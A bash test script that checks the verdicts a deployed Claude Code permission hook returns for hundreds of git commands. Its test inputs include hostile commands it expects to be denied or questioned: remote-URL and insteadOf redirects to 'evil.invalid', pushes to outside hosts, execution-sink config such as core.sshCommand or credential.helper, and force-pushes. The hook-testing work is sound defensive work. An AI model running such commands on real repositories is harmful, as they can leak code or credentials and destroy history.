#!/usr/bin/env bash
# probe-pg2-95hna.sh — combined post-apply verification for the internal/rules/git
# rule family, consolidating the probe tables from FIVE closed verify beads
# (pg2-lkj60, pg2-2xc9y, pg2-tm0rd, pg2-vmxho, pg2-fm45q) plus the two verdict-
# change beads that never had a verify bead of their own (pg2-fkmg4, pg2-ur9zc).
#
# UNLIKE the per-bead probe scripts this consolidates (probe-pg2-os1kq.sh,
# probe-pg2-szadj.sh, probe-pg2-ur9zc.sh, probe-pg2-fkmg4.sh, ...), THIS SCRIPT
# DOES NOT `go build` from worktree source. Its whole point is to exercise the
# DEPLOYED binary that Claude Code actually shells out to on this machine, so a
# regression in the *installed* artifact (stale nix generation, a botched apply,
# a wrapper misconfiguration) would show up here even when the worktree source
# is fine. Resolution order for CETA_BIN:
#
#   1. $CETA_BIN if the caller sets it explicitly.
#   2. /etc/profiles/per-user/$USER/bin/claude-extended-tool-approver (the
#      home-manager-managed per-user profile symlink into the nix store — this
#      is how the ceta package reaches the Claude Code hook on this machine;
#      see home/programs/claude-extended-tool-approver/default.nix).
#   3. `command -v claude-extended-tool-approver` as a last-resort fallback.
#
# The script REFUSES to run (loudly, non-zero exit) rather than silently fall
# back to a fresh build if it cannot resolve a binary that lives under
# /nix/store (i.e. is actually deployed, not something built ad hoc on $PATH
# from a worktree). See the resolve_bin() function below.
#
# CORRECTED EXPECTATIONS (operator rulings postdating the five closed beads'
# probe tables — pg2-4yy4r item 5 -> pg2-fkmg4, commit 30eeac07; pg2-ur9zc,
# commit 55d6b573):
#
#   - `git reset --hard` (and every abbreviation: --har/--ha/--h) is ABSTAIN
#     ({} — no permissionDecision key), NOT `ask`.
#   - `git branch` with git's OWN guard removed (-D/-M/-C, or an explicit
#     -f/--force in any spelling/position) is ABSTAIN, NOT `ask`.
#   - `git branch -f other main` (force-move onto an existing target) is now
#     GATED (abstain) — the closed pg2-lkj60 bead's "MUST still allow" line for
#     this exact command is WRONG and is corrected here.
#   - Reason strings on these rows are moot: Abstain serializes to the empty
#     object `{}`, so there IS no permissionDecisionReason to compare — the
#     original beads' "confirm the reason string" acceptance criteria applied
#     to a since-superseded `ask`-with-reason verdict and do not carry forward.
#
# A THIRD, PREVIOUSLY-UNLISTED CORRECTION FOUND WHILE RUNNING THIS PROBE:
# `git clean` (every spelling: bare, -n, -fdx, --force, --f, ...) is ALSO
# ABSTAIN now, not `ask`. This is bead pg2-u0e0c (CLOSED, landed fae2febc,
# "git clean returns Abstain for every spelling; flag-aware row design
# rejected", operator ruling pg2-4yy4r item 3) — it is NOT one of the seven
# beads pg2-95hna names, and pg2-95hna's own "CORRECTED EXPECTATIONS" section
# does not mention it, but the five closed beads' bodies used `git clean` as a
# "MUST be unchanged" sibling control recorded BEFORE pg2-u0e0c landed. That
# control line is therefore ALSO stale, for the same reason the branch/reset
# ones are. This is a known, already-ruled, already-verified (pg2-u0e0c has
# its own probe-pg2-u0e0c.sh) correction, not a fresh defect — see pg2-u0e0c's
# explicit "Do not re-litigate it here" instruction. It is applied below and
# called out at each site rather than filed as a new deviation bead.
#
# REASON-STRING CAVEAT DISCOVERED WHILE RUNNING THIS PROBE: the hook JSON's
# `permissionDecisionReason` carries the SPECIFIC winning rule's reason for
# Ask/Reject, but for an APPROVE reached through the multi-subcommand chain
# evaluator it is the GENERIC "all sub-commands approved" — the specific
# per-rule reason (e.g. "read-only git config") is visible only on STDERR
# (`claude-extended-tool-approver: <rule> -> <decision>: <reason>`). This is
# an artifact of the chain aggregator collapsing individual approve reasons,
# not a behavior regression, so this script's reason checks read STDERR for
# `allow` rows and the JSON field for `ask`/`deny` rows (which already carry
# the specific text there).
#
# ASKLOG ISOLATION: XDG_DATA_HOME is exported to a throwaway directory for
# every invocation below, so no synthetic probe row ever reaches the real
# corpus (`~/.local/share/claude-extended-tool-approver/asks.db`). See
# internal/asklog/store.go's dbPath resolution — it derives the DB path
# entirely from XDG_DATA_HOME, so this is sufficient isolation; mark-excluded
# is not needed as long as this variable is genuinely overridden (never
# inherited) for the probe process.
#
# pg2-cbihz PROHIBITION: this script never calls evaluate/baseline/compare —
# it invokes the deployed binary directly in hook mode (stdin JSON in, hook
# JSON out), which is read/append-only against the ISOLATED throwaway DB, and
# never touches the production asklog at all.
set -euo pipefail

pkg_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
work="$(mktemp -d "${TMPDIR:-/tmp}/pg2-95hna-probe.XXXXXX")"
trap 'rm -rf "$work"' EXIT

resolve_bin() {
  if [[ -n ${CETA_BIN:-} ]]; then
    echo "$CETA_BIN"
    return 0
  fi
  local candidate="/etc/profiles/per-user/${USER}/bin/claude-extended-tool-approver"
  if [[ -x $candidate ]]; then
    echo "$candidate"
    return 0
  fi
  candidate="$(command -v claude-extended-tool-approver || true)"
  if [[ -n $candidate ]]; then
    echo "$candidate"
    return 0
  fi
  return 1
}

bin="$(resolve_bin)" || {
  echo "FATAL: could not resolve a deployed claude-extended-tool-approver binary." >&2
  echo "Refusing to fall back to a fresh 'go build' — this probe's entire point is" >&2
  echo "to exercise the DEPLOYED artifact. Set CETA_BIN explicitly if it lives" >&2
  echo 'somewhere other than /etc/profiles/per-user/$USER/bin/.' >&2
  exit 2
}

resolved="$(readlink -f "$bin" 2>/dev/null || echo "$bin")"
if [[ $resolved != /nix/store/* ]]; then
  echo "FATAL: resolved binary '$bin' -> '$resolved' does not live under" >&2
  echo "/nix/store — it does not look like a deployed (nix-built) artifact." >&2
  echo "Refusing to probe it as though it were the deployed binary." >&2
  exit 2
fi
if [[ $resolved == "$pkg_root"/* || $resolved == "$(cd "$pkg_root/../.." && pwd)"/* ]]; then
  echo "FATAL: resolved binary '$resolved' is inside this repo/worktree — that is" >&2
  echo "a dev build, not the deployed artifact. Refusing to probe it." >&2
  exit 2
fi

ver="$("$bin" version 2>/dev/null || echo unknown)"
echo "=== DEPLOYED BINARY UNDER TEST ==="
echo "path:     $bin"
echo "resolved: $resolved"
echo "version:  $ver"
echo

export XDG_DATA_HOME="$work/xdg-data"
mkdir -p "$XDG_DATA_HOME"
echo "asklog isolation: XDG_DATA_HOME=$XDG_DATA_HOME (throwaway, removed on exit)"
echo

pass=0
fail=0
declare -a fail_rows=()

# probe EXPECTED CMD [REASON_SUBSTR]
#   EXPECTED: allow | ask | deny | abstain
#   REASON_SUBSTR (optional): substring the reason text MUST contain. For
#     ask/deny this is checked against hookSpecificOutput.permissionDecisionReason
#     (which carries the specific rule reason); for allow it is checked against
#     STDERR's per-rule trace line instead, because the JSON reason for an
#     approve reached through the chain evaluator collapses to the generic
#     "all sub-commands approved" (see the file header's REASON-STRING CAVEAT).
#     abstain has no reason field or trace line to check at all.
probe() {
  local expected="$1" cmd="$2" reason_substr="${3:-}"
  local out err decision reason
  err="$(mktemp "$work/stderr.XXXXXX")"
  out="$(jq -cn --arg c "$cmd" \
    '{hook_event_name:"PreToolUse",session_id:"pg2-95hna-probe",cwd:"/tmp",permission_mode:"default",tool_name:"Bash",tool_input:{command:$c}}' |
    "$bin" 2>"$err" || true)"
  if [[ $out == "{}" || -z $out ]]; then
    decision="abstain"
    reason=""
  else
    decision="$(printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecision // "unknown"' 2>/dev/null || echo "unparseable")"
    if [[ $decision == "allow" ]]; then
      reason="$(cat "$err")"
    else
      reason="$(printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason // ""' 2>/dev/null || echo "")"
    fi
  fi
  rm -f "$err"

  local status="PASS"
  if [[ $decision != "$expected" ]]; then
    status="FAIL(verdict)"
  elif [[ -n $reason_substr && $reason != *"$reason_substr"* ]]; then
    status="FAIL(reason)"
  fi

  if [[ $status == "PASS" ]]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    fail_rows+=("$status  expected=$expected got=$decision  cmd=[$cmd]  reason=[$reason]")
  fi
  printf '%-13s expected=%-8s got=%-8s %s\n' "$status" "$expected" "$decision" "$cmd"
}

section() {
  echo
  echo "=== $1 ==="
}

# ===========================================================================
# pg2-lkj60 — long-flag prefix matcher + branch force-delete gate (pg2-os1kq)
# CORRECTED: reset --hard family and branch force-delete are now ABSTAIN.
# ===========================================================================
section "pg2-lkj60: reset --hard abbreviations [CORRECTED: abstain, was ask]"
probe abstain 'git reset --hard HEAD~1'
probe abstain 'git reset --har  HEAD~1'
probe abstain 'git reset --ha   HEAD~1'
probe abstain 'git reset --h    HEAD~1'

section "pg2-lkj60: rebase --interactive abbreviations [abstain, editor requirement]"
probe abstain 'git rebase --interactiv'
probe abstain 'git rebase --intera'
probe abstain 'git rebase --int'
probe abstain 'git rebase --in'

section "pg2-lkj60: branch force-delete, every spelling [CORRECTED: abstain, was ask]"
probe abstain 'git branch -D foo'
probe abstain 'git branch -Df foo'
probe abstain 'git branch -fD foo'
probe abstain 'git branch --delete --force foo'
probe abstain 'git branch --delet --forc foo'
probe abstain 'git branch -d --force foo'
probe abstain 'git branch --delete -f foo'
probe abstain 'git branch -f --delet foo'
probe abstain 'git branch --d --f foo'
probe abstain 'git branch foo -D'
probe abstain 'git branch foo --delete --force'
probe abstain 'git branch -r -D origin/foo'
probe abstain 'git branch -Dt foo'
probe abstain 'git branch -Dft foo'

section "pg2-lkj60: adjacent branch operations MUST still allow"
probe allow 'git branch -d foo'
probe allow 'git branch --delete foo'
probe allow 'git branch --delet foo'
probe allow 'git branch -m old new'
probe allow 'git branch'
probe allow 'git branch -a'
probe allow 'git branch --list'
probe allow 'git branch -- -D'

section "pg2-lkj60 CORRECTION: branch -f/-M/-C are now GATED (abstain), not allow"
probe abstain 'git branch -f other main'
probe abstain 'git branch --force other main'
probe abstain 'git branch -M old new'
probe abstain 'git branch -C a b'

section "pg2-lkj60: false-positive guards (upstream VALUE must not manufacture a verdict)"
probe allow 'git branch -uorigin/DEV foo'
probe allow 'git branch -udrafts/x foo'
probe allow 'git branch -tdirect foo'

section "pg2-lkj60 sibling controls"
probe deny 'git push --force'
probe deny 'git push -fu origin main'
probe deny 'git push origin +main'
probe deny 'git push origin :main'
probe deny 'git push --mirror origin'
probe deny 'git push --force-with-lease origin main:other'
probe allow 'git push --force-with-lease origin main'
probe deny 'git push https://example.invalid/x.git main'
probe allow 'git push /tmp/throwaway-repo main'
probe deny 'git remote -v add upstream https://example.invalid/x.git'
probe allow 'git remote -v'
probe allow 'git remote show origin'
probe allow 'git remote get-url origin'
probe ask 'git config core.hooksPath /tmp/h'
probe deny 'git config remote.origin.url https://evil.invalid/x.git'
probe allow 'git config --get user.email'
# CORRECTION (pg2-u0e0c, see header note): git clean now abstains, not asks.
probe abstain 'git clean'
probe abstain 'git clean -fdx'
probe abstain 'git clean --f'

# ===========================================================================
# pg2-2xc9y — git config interlock/sink gate (pg2-szadj). UNAFFECTED by the
# fkmg4/ur9zc corrections; the original probe table stands as recorded.
# ===========================================================================
section "pg2-2xc9y: execution sinks MUST ask"
probe ask 'git config core.hooksPath /tmp/h'
probe ask 'git config core.pager EVIL'
probe ask 'git config core.editor EVIL'
probe ask 'git config sequence.editor EVIL'
probe ask 'git config core.sshCommand EVIL'
probe ask 'git config core.fsmonitor EVIL'
probe ask 'git config diff.external EVIL'
probe ask 'git config diff.d.textconv EVIL'
probe ask 'git config diff.d.command EVIL'
probe ask 'git config merge.d.driver EVIL'
probe ask 'git config filter.d.clean EVIL'
probe ask 'git config filter.d.smudge EVIL'
probe ask 'git config filter.d.process EVIL'
probe ask 'git config credential.helper EVIL'
probe ask 'git config init.templateDir /tmp/t'
probe ask 'git config include.path /tmp/i'
probe ask 'git config includeIf.gitdir:/x/.path /tmp/i'
probe ask 'git config pager.log EVIL'

section "pg2-2xc9y: disabled interlocks MUST ask"
probe ask 'git config clean.requireForce false'
probe ask 'git config http.sslVerify false'
probe ask 'git config receive.denyCurrentBranch false'

section "pg2-2xc9y: flag-displaced spellings of a gated key MUST ask"
probe ask 'git config --global clean.requireForce false'
probe ask 'git config --local clean.requireForce false'
probe ask 'git config --system clean.requireForce false'
probe ask 'git config --type=bool clean.requireForce false'
probe ask 'git config --unset clean.requireForce'
probe ask 'git config --replace-all clean.requireForce false'
probe ask 'git config -f .git/config clean.requireForce false'
probe ask 'git config set core.hooksPath /tmp/h'
probe ask 'git config unset clean.requireForce'
probe ask 'git config CORE.HooksPath /tmp/h'

section "pg2-2xc9y: silent redirects MUST deny"
probe deny 'git config url.https://evil.invalid/.insteadOf https://github.com/'
probe deny 'git config url.https://evil.invalid/.pushInsteadOf https://github.com/'
probe deny 'git config remote.origin.url https://evil.invalid/x.git'
probe deny 'git config remote.origin.pushurl https://evil.invalid/x.git'

section "pg2-2xc9y: reads MUST still allow, reason 'read-only git config'"
probe allow 'git config --get user.email' 'read-only git config'
probe allow 'git config --list' 'read-only git config'
probe allow 'git config core.hooksPath' 'read-only git config'
probe allow 'git config clean.requireForce' 'read-only git config'
probe allow 'git config --get-regexp ^user' 'read-only git config'
probe allow 'git config --get core.hooksPath' 'read-only git config'
probe allow 'git config get core.hooksPath' 'read-only git config'
probe allow 'git config list' 'read-only git config'
probe allow 'GIT_DIR=/other git config --get user.email' 'read-only git config'

section "pg2-2xc9y: ordinary non-safety writes MUST still allow"
probe allow 'git config user.email a@b.c'
probe allow 'git config commit.gpgsign true'
probe allow 'git config branch.main.remote origin'

section "pg2-2xc9y: unchanged controls"
probe abstain 'git -c clean.requireForce=false clean'
# CORRECTION (pg2-u0e0c, see header note): git clean now abstains, not asks.
probe abstain 'git clean'
probe abstain 'git clean -fdx'
probe abstain 'git clean -n'
# The compound below STAYS ask: the config-write half still asks, and Ask
# outranks Abstain in the MostRestrictive fold, so the fold is unaffected by
# clean's own verdict moving to abstain.
probe ask 'git config clean.requireForce false && git clean'
probe allow 'bd comment pg2-2xc9y "git config clean.requireForce false"'
probe allow 'git commit -m "git config clean.requireForce false"'

section "pg2-2xc9y SCOPE NOTE: redirected reads allow, redirected writes still ask"
probe allow 'GIT_DIR=/other git config --get user.email'
probe ask 'GIT_DIR=/other git config user.email a@b.c'
probe ask 'GIT_WORK_TREE=/other git config user.email a@b.c'
probe ask 'GIT_DIR=/other git config core.hooksPath /tmp/h'
probe deny 'GIT_DIR=/other git config remote.origin.url https://evil.invalid/x'

# ===========================================================================
# pg2-tm0rd — git remote mutation Reject (pg2-8imjo)
# ===========================================================================
section "pg2-tm0rd: flag-displaced remote mutations MUST deny"
probe deny 'git remote -v add upstream https://example.invalid/x.git'
probe deny 'git remote --verbose add upstream https://example.invalid/x.git'
probe deny 'git remote -v set-url origin https://example.invalid/x.git'
probe deny 'git remote --verbose set-url origin https://example.invalid/x.git'
probe deny 'git remote -v rename origin upstream'
probe deny 'git remote -v remove origin'
probe deny 'git -C /some/path remote -v add upstream https://example.invalid/x.git'

section "pg2-tm0rd: bare-form remote mutations MUST deny"
probe deny 'git remote add upstream https://example.invalid/x.git'
probe deny 'git remote remove origin'
probe deny 'git remote rm origin'
probe deny 'git remote rename origin upstream'
probe deny 'git remote set-url origin https://example.invalid/x.git'
probe deny 'git remote set-head origin main'
probe deny 'git remote set-branches origin main'

section "pg2-tm0rd: read-only remote forms MUST still allow"
probe allow 'git remote'
probe allow 'git remote -v'
probe allow 'git remote --verbose'
probe allow 'git remote show origin'
probe allow 'git remote get-url origin'
probe allow 'git remote get-url --all origin'
probe allow 'git remote -v show origin'
probe allow 'git remote prune origin'
probe allow 'git remote update'

section "pg2-tm0rd: text-vs-parsed MUST still allow"
probe allow 'bd comment pg2-tm0rd "... git remote set-url ..."'
probe allow 'bd update pg2-tm0rd --notes "... git remote add ..."'
probe allow 'git commit -m "git remote set-url is prohibited"'

section "pg2-tm0rd sibling controls [branch -D CORRECTED: abstain, was ask]"
probe deny 'git push --force'
probe deny 'git push -fu origin main'
probe deny 'git push origin +main'
probe deny 'git push origin :main'
probe deny 'git push --mirror origin'
probe deny 'git push --force-with-lease origin main:other'
probe allow 'git push --force-with-lease origin main'
probe deny 'git push https://example.invalid/x.git main'
probe allow 'git push /tmp/throwaway-repo.git main'
probe abstain 'git branch -D feat'

# ===========================================================================
# pg2-vmxho — push-to-URL Reject (pg2-abb65)
# ===========================================================================
section "pg2-vmxho: push-to-URL MUST deny"
probe deny 'git push https://example.invalid/x.git main'
probe deny 'git push http://example.invalid/x.git main'
probe deny 'git push git://example.invalid/x.git main'
probe deny 'git push ssh://example.invalid/x.git main'
probe deny 'git push git@example.invalid:evil/x.git main'
probe deny 'git push user@host:path/to/repo.git HEAD:main'
probe deny 'git push -u https://example.invalid/x.git main'
probe deny 'git push --repo https://example.invalid/x.git'

section "pg2-vmxho: SHADOW FIX — force-with-lease to a URL MUST deny, not ask"
probe deny 'git push --force-with-lease https://example.invalid/x.git main'

section "pg2-vmxho: regression guards MUST still allow"
probe allow 'git push /tmp/throwaway-repo main'
probe allow 'git push ./some-repo main'
probe allow 'git push ../some-repo main'
probe allow 'git push file:///tmp/throwaway-repo main'
probe allow 'git push origin main'
probe allow 'git push -u origin main'
probe allow 'git push'
probe allow 'git push upstream main'
probe allow 'git push origin HEAD'
probe allow 'git commit -m "git push https://example.invalid/x.git main"'

section "pg2-vmxho sibling controls [branch -D CORRECTED: abstain, was ask]"
probe deny 'git push --force-with-lease origin main:other'
probe deny 'git push origin :main'
probe deny 'git push --mirror origin'
probe allow 'git push --force-with-lease origin main'
probe ask 'git push --force-with-lease upstream main'
probe abstain 'git branch -D feat'

# ===========================================================================
# pg2-fm45q — force-push / remote-ref-delete Rejects, 13 shapes (pg2-bohpm)
# ===========================================================================
section "pg2-fm45q: the 13 deny shapes"
probe deny 'git push --force'
probe deny 'git push -f origin main'
probe deny 'git push -fu origin main'
probe deny 'git push -uf origin main'
probe deny 'git push origin +main'
probe deny 'git push origin +main:main'
probe deny 'git push origin main:other +feat'
probe deny 'git push --force-with-lease origin main:other'
probe deny 'git push --force-with-lease=other origin main:other'
probe deny 'git push origin :main'
probe deny 'git push --delete origin main'
probe deny 'git push -d origin main'
probe deny 'git push --mirror origin'

section "pg2-fm45q: abbreviation spellings MUST deny"
# --force-w abbreviates --force-with-lease (measured minimum, git.go's
# minAbbrevRepo-adjacent comment), which is CONDITIONALLY deny (cross-branch)
# not unconditionally deny like --delete/--mirror — so the abbreviation must
# be confirmed against a cross-branch target, matching the canonical spelling
# in "the SHADOW FIX" case above, not a bare same-branch push (which is the
# always-allowed post-rebase idiom and would falsely read as a miss).
probe deny 'git push --force-w origin main:other'
probe allow 'git push --force-w origin main'
probe deny 'git push --del origin main'
probe deny 'git push --m origin'

section "pg2-fm45q: regression guards MUST still allow"
probe allow 'git push --force-with-lease'
probe allow 'git push --force-with-lease origin main'
probe allow 'git push --force-with-lease=main:abc123 origin main'
probe allow 'git push origin main:main'
probe allow 'git push'
probe allow 'git push -u origin main'
probe allow 'git push --tags'
probe allow 'git push origin HEAD'
probe allow 'git commit -m "never --force push"'
probe allow 'bd comment pg2-fm45q "quoting git push --force and +main"'

section "pg2-fm45q: branch -D [CORRECTED: abstain, was ask — still not allow]"
probe abstain 'git branch -D feat'

# ===========================================================================
# pg2-fkmg4 — git branch verdict by SAFETY, not by flag (operator ruling
# pg2-4yy4r item 5). No prior verify bead; this IS the first verification.
# ===========================================================================
section "pg2-fkmg4: the ten verbatim rows the bead recorded"
probe abstain 'git branch -D foo'
probe abstain 'git branch -Df foo'
probe abstain 'git branch -fD foo'
probe abstain 'git branch --delete --force foo'
probe abstain 'git branch --delet --forc foo'
probe abstain 'git branch -M old new'
probe abstain 'git branch -C a b'
probe allow 'git branch -d merged'
probe allow 'git branch -m old new'
probe allow 'git branch'

section "pg2-fkmg4: UNSAFE fused uppercase forms, bare and clustered"
probe abstain 'git branch -Dv foo'
probe abstain 'git branch -vM old new'
probe abstain 'git branch -rC a b'
probe abstain 'git branch -Dt foo'
probe abstain 'git branch -Dft foo'

section "pg2-fkmg4: UNSAFE — explicit force removes the guard from ANY of them"
probe abstain 'git branch -f other main'
probe abstain 'git branch --force other main'
probe abstain 'git branch --forc other main'
probe abstain 'git branch -d --force foo'
probe abstain 'git branch --delete -f foo'
probe abstain 'git branch -df foo'
probe abstain 'git branch -fd foo'
probe abstain 'git branch -f --delet foo'
probe abstain 'git branch -m -f old new'
probe abstain 'git branch --move --force old new'
probe abstain 'git branch -c -f a b'
probe abstain 'git branch --copy --force a b'
probe abstain 'git branch --d --f foo'
probe abstain 'git branch --force=x other main'

section "pg2-fkmg4: UNSAFE — flag AFTER the operand (position must not matter)"
probe abstain 'git branch foo -D'
probe abstain 'git branch old new -M'
probe abstain 'git branch foo --delete --force'
probe abstain 'git branch other main -f'

section "pg2-fkmg4: SAFE — git's own guard is still in place"
probe allow 'git branch -d merged'
probe allow 'git branch --delete merged'
probe allow 'git branch --delet merged'
probe allow 'git branch -m old new'
probe allow 'git branch --move old new'
probe allow 'git branch -c a b'
probe allow 'git branch --copy a b'
probe allow 'git branch new-branch'
probe allow 'git branch new-branch origin/main'

section "pg2-fkmg4: SAFE — read / list forms"
probe allow 'git branch'
probe allow 'git branch --list'
probe allow 'git branch -a'
probe allow 'git branch -r'
probe allow 'git branch -v'
probe allow 'git branch -vv'
probe allow 'git branch --show-current'
probe allow 'git branch --contains HEAD'
probe allow 'git branch --merged main'
probe allow 'git branch --no-merged main'
probe allow "git branch --format='%(refname:short)'"
probe allow 'git branch --sort=-committerdate'
probe allow 'git branch --set-upstream-to=origin/main foo'
probe allow 'git branch --unset-upstream foo'
probe allow 'git branch --edit-description foo'

section "pg2-fkmg4: SAFE — the --no- negation trap"
probe allow 'git branch --no-force other main'
probe allow 'git branch --no-delete foo'
probe allow 'git branch --no-move old new'
probe allow 'git branch --no-copy a b'
probe allow 'git branch --no-contains HEAD'

section "pg2-fkmg4: SAFE — end-of-options terminator"
probe allow 'git branch -- -D'
probe allow 'git branch -- -M'
probe allow 'git branch -- -C'
probe allow 'git branch -- -f'
probe allow 'git branch -- --delete --force'

section "pg2-fkmg4: SAFE — case sensitivity (-d/-m/-c differ from -D/-M/-C, -F is not -f)"
probe allow 'git branch -d foo'
probe allow 'git branch -m old new'
probe allow 'git branch -c a b'
probe allow 'git branch -dF foo'

section "pg2-fkmg4: SAFE — a glued short VALUE is not a cluster of flag letters"
probe allow 'git branch -uorigin/DEV foo'
probe allow 'git branch -udrafts/x foo'
probe allow 'git branch -tdirect foo'
probe allow 'git branch -uorigin/MAIN foo'
probe allow 'git branch -uorigin/CI foo'
probe allow 'git branch -uorigin/feature-docs foo'

section "pg2-fkmg4: SAFE — a branch NAME is an operand, never scanned for flag letters"
probe allow 'git branch -d DEV-123'
probe allow 'git branch -m Cool-Feature Mint'
probe allow 'git branch CI-1494'

section "pg2-fkmg4: SCOPE GUARD — no OTHER git subcommand's verdict may move"
probe abstain 'git reset --hard HEAD~1'
probe allow 'git reset --soft HEAD~1'
# CORRECTION (pg2-u0e0c, see header note): git clean now abstains, not asks.
probe abstain 'git clean -fdx'
probe deny 'git push --force origin main'
probe allow 'git push origin main'
probe deny 'git push -f origin main'
probe abstain 'git rebase --interactiv'
probe deny 'git remote -v add upstream https://example.invalid/x.git'
probe allow 'git remote -v'
probe ask 'git config core.hooksPath /tmp/h'
probe allow 'git config --get user.email'
probe allow 'git log --oneline -5'
probe allow 'git commit -m "wip"'
probe allow 'git checkout -b feat'

section "pg2-fkmg4: REGRESSION — text-vs-parsed (the flag as an ARGUMENT, never a flag)"
probe allow 'git commit -m "git branch -M is now abstained (pg2-fkmg4)"'
probe allow 'bd comment pg2-fkmg4 -m "git branch -C measured ALLOW"'

# ===========================================================================
# pg2-ur9zc — git reset --hard returns Abstain (operator ruling pg2-4yy4r
# item 4). No prior verify bead; this IS the first verification.
# ===========================================================================
section "pg2-ur9zc: THE RULING — an ordinary hard reset emits {} (abstain)"
probe abstain 'git reset --hard'
probe abstain 'git reset --hard HEAD~1'
probe abstain 'git reset --hard origin/main'
probe abstain 'git reset --hard && echo ok'

section "pg2-ur9zc: abbreviations git itself parses AS --hard"
probe abstain 'git reset --har HEAD~1'
probe abstain 'git reset --ha HEAD~1'
probe abstain 'git reset --h HEAD~1'

section "pg2-ur9zc: corroboration — leaves that already fell through to {} before this bead"
probe abstain 'git bisect start'
probe abstain 'git notes list'

section "pg2-ur9zc: redirected context still ASKS for EVERY reset spelling (inversion fix)"
probe ask 'GIT_DIR=/other git reset --hard HEAD~1'
probe ask 'GIT_DIR=/other git reset --har HEAD~1'
probe ask 'GIT_DIR=/other git reset --soft HEAD~1'
probe ask 'GIT_WORK_TREE=/other git reset --hard HEAD~1'

section "pg2-ur9zc: NOT WIDENED — non-hard reset modes keep their allow"
probe allow 'git reset HEAD~1'
probe allow 'git reset --soft HEAD~1'
probe allow 'git reset --mixed HEAD~1'
probe allow 'git reset --keep HEAD~1'
probe allow 'git reset --merge HEAD~1'
probe allow 'git reset --no-hard HEAD~1'
probe allow 'git reset -- --hard'

section "pg2-ur9zc: adjacent arms — git clean [CORRECTION pg2-u0e0c: abstain, not ask]"
probe abstain 'git clean -fd'
probe abstain 'git clean --force'

# ===========================================================================
# pg2-fkmg4/pg2-ur9zc explicit acceptance-criteria callout (pg2-95hna AC #2):
# reset --hard (+abbreviations) abstains; branch -D/-Df/-M/-C/-f abstains;
# read-only branch ops still allow. All already covered above; restated here
# as a single block for direct traceability to that acceptance criterion.
# ===========================================================================
section "pg2-95hna AC#2: explicit callout block"
probe abstain 'git reset --hard'
probe abstain 'git reset --har'
probe abstain 'git branch -D foo'
probe abstain 'git branch -Df foo'
probe abstain 'git branch -M old new'
probe abstain 'git branch -C a b'
probe abstain 'git branch -f other main'
probe allow 'git branch'
probe allow 'git branch -a'
probe allow 'git branch --list'
probe allow 'git branch -d merged'

echo
echo "=== SUMMARY ==="
echo "pass: $pass"
echo "fail: $fail"
if [[ $fail -gt 0 ]]; then
  echo
  echo "--- FAILURES (deviations from corrected expectations — file each as its own bead) ---"
  for row in "${fail_rows[@]}"; do
    echo "$row"
  done
  exit 1
fi

echo
echo "All probes matched corrected expectations against the deployed binary."
